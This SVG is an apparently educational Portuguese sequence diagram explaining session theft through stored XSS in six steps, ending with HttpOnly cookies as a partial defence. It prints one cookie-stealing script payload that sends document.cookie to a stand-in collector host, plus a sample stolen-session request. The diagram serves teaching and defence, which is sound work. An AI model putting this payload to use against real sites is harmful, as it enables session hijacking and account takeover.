<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 560" role="img" aria-labelledby="t d">
  <title id="t">Roubo de sessão por XSS armazenado: o diagrama de sequência</title>
  <desc id="d">Um diagrama de sequência com quatro colunas: o atacante, o servidor da aplicação com seu banco, o navegador da vítima já autenticada e o coletor controlado pelo atacante. Passo 1: o atacante envia uma vez o payload para um campo que fica salvo, como um comentário; o servidor grava no banco. Passo 2: mais tarde, a vítima, que está logada, abre a página que mostra aquele comentário. Passo 3: o servidor devolve a página com o conteúdo e, no meio dele, o script do atacante. Passo 4: o navegador da vítima executa o script no contexto do site; como o cookie de sessão não é marcado HttpOnly, o JavaScript consegue lê-lo com document.cookie. Passo 5: o script envia o cookie para o coletor do atacante, por exemplo com uma imagem cujo endereço carrega o cookie. Passo 6: o atacante põe o cookie roubado no próprio navegador e passa a navegar como a vítima, sem nunca saber a senha dela. A lição embaixo diz que marcar o cookie como HttpOnly tira o document.cookie do alcance do script e corta esse passo.</desc>
  <style>
    text { font-family: ui-monospace, "DejaVu Sans Mono", Menlo, Consolas, monospace; fill: #e6ede8; }
    .t { font-size: 17px; font-weight: 700; }
    .h { font-size: 13px; font-weight: 700; }
    .b { font-size: 11.5px; }
    .s { font-size: 10.5px; fill: #9fb0a6; }
    .code { font-size: 10.5px; fill: #5cc8d8; }
    .n { fill: #e8c46a; font-weight: 700; }
    .atk { fill: #2a1b1b; stroke: #e88a8a; stroke-width: 1.3; }
    .vic { fill: #16201b; stroke: #5ee08a; stroke-width: 1.3; }
    .srv { fill: #1b2a3a; stroke: #5cc8d8; stroke-width: 1.2; }
    .life { stroke: #2c3a33; stroke-width: 1.4; stroke-dasharray: 4 5; }
    .msg { stroke: #5ee08a; stroke-width: 1.8; fill: none; }
    .msgr { stroke: #e88a8a; stroke-width: 1.8; fill: none; }
  </style>
  <rect width="900" height="560" fill="#121815"/>
  <text class="t" x="24" y="30">Roubo de sessão por XSS armazenado, passo a passo</text>

  <!-- actor headers -->
  <rect class="atk" x="40" y="48" width="150" height="40" rx="8"/>
  <text class="h" x="115" y="73" text-anchor="middle" fill="#e88a8a">atacante</text>
  <rect class="srv" x="280" y="48" width="180" height="40" rx="8"/>
  <text class="h" x="370" y="67" text-anchor="middle" fill="#5cc8d8">servidor + banco</text>
  <text class="s" x="370" y="82" text-anchor="middle">(a app vulnerável)</text>
  <rect class="vic" x="545" y="48" width="175" height="40" rx="8"/>
  <text class="h" x="632" y="67" text-anchor="middle" fill="#5ee08a">vítima (logada)</text>
  <text class="s" x="632" y="82" text-anchor="middle">navegador</text>
  <rect class="atk" x="760" y="48" width="120" height="40" rx="8"/>
  <text class="h" x="820" y="73" text-anchor="middle" fill="#e88a8a">coletor</text>

  <!-- lifelines -->
  <line class="life" x1="115" y1="88" x2="115" y2="470"/>
  <line class="life" x1="370" y1="88" x2="370" y2="470"/>
  <line class="life" x1="632" y1="88" x2="632" y2="470"/>
  <line class="life" x1="820" y1="88" x2="820" y2="470"/>

  <!-- 1 plant -->
  <path class="msgr" d="M115,120 L370,120" marker-end="url(#ar)"/>
  <text class="n" x="120" y="112">1</text>
  <text class="b" x="130" y="112" fill="#e6ede8">planta o payload uma vez (um comentário)</text>
  <text class="code" x="130" y="137">&lt;script&gt;new Image().src="http://coletor/?c="+document.cookie&lt;/script&gt;</text>
  <rect x="310" y="150" width="120" height="20" rx="4" fill="#1b2a3a" stroke="#5cc8d8"/>
  <text class="code" x="370" y="164" text-anchor="middle">INSERT no banco</text>

  <!-- 2 victim opens -->
  <path class="msg" d="M632,200 L370,200" marker-end="url(#ag)"/>
  <text class="n" x="560" y="192">2</text>
  <text class="b" x="400" y="192" fill="#e6ede8">a vítima abre a página</text>

  <!-- 3 server returns -->
  <path class="msg" d="M370,236 L632,236" marker-end="url(#ag)"/>
  <text class="n" x="380" y="228">3</text>
  <text class="b" x="392" y="228" fill="#e6ede8">a resposta traz o conteúdo + o script do atacante</text>

  <!-- 4 execute -->
  <rect x="612" y="252" width="40" height="70" rx="4" fill="#16201b" stroke="#5ee08a"/>
  <text class="n" x="662" y="272">4</text>
  <text class="b" x="676" y="272" fill="#e6ede8">o navegador executa o script no contexto do site;</text>
  <text class="b" x="676" y="290" fill="#e6ede8">o cookie NÃO é HttpOnly, então o JS lê</text>
  <text class="code" x="676" y="308">document.cookie</text>

  <!-- 5 exfil -->
  <path class="msgr" d="M632,348 L820,348" marker-end="url(#ar)"/>
  <text class="n" x="640" y="340">5</text>
  <text class="b" x="652" y="340" fill="#e6ede8">envia o cookie ao coletor</text>
  <text class="code" x="652" y="365">GET /?c=security=low;%20PHPSESSID=c7701e…</text>

  <!-- 6 reuse -->
  <path class="msgr" d="M820,404 L115,404" marker-end="url(#ar)"/>
  <text class="n" x="760" y="396">6</text>
  <text class="b" x="300" y="396" fill="#e6ede8">o atacante põe o cookie no próprio navegador → navega como a vítima</text>
  <text class="s" x="300" y="421">sem nunca saber a senha: a sessão é a credencial</text>

  <!-- lesson -->
  <rect x="40" y="488" width="840" height="48" rx="8" fill="#16201b" stroke="#5ee08a" stroke-width="1.2"/>
  <text class="h g" x="54" y="508">Defesa que corta o passo 4:</text>
  <text class="b" x="240" y="508" fill="#e6ede8">marcar o cookie de sessão como HttpOnly tira o</text>
  <text class="code" x="54" y="526">document.cookie</text>
  <text class="b" x="160" y="526" fill="#e6ede8">do alcance do script — o XSS ainda roda, mas não lê a sessão. É defesa em profundidade, não a cura.</text>

  <defs>
    <marker id="ag" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0,0 L9,4.5 L0,9 z" fill="#5ee08a"/></marker>
    <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto"><path d="M0,0 L9,4.5 L0,9 z" fill="#e88a8a"/></marker>
  </defs>
</svg>
